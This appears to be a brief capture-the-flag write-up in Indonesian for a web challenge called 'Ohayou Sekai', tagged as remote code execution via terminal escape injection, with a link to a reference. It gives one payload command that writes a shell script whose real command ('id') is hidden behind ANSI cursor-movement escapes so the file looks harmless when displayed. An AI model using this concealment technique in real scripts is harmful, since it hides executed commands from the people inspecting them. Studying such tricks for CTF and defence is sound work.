## Ohayou Sekai
- Chal: WEB
- Difficulty: Ntahlah
- Vuln: RCE

Intinya, ini soalnya tentang Terminal Escape Injection <br>
Referensi: https://www.infosecmatter.com/terminal-escape-injection/

Cara membuat payload:
```
echo -e '#!/bin/sh\nid\nexit 0\n\033[2Aecho "Hello World!"\n' > payload
```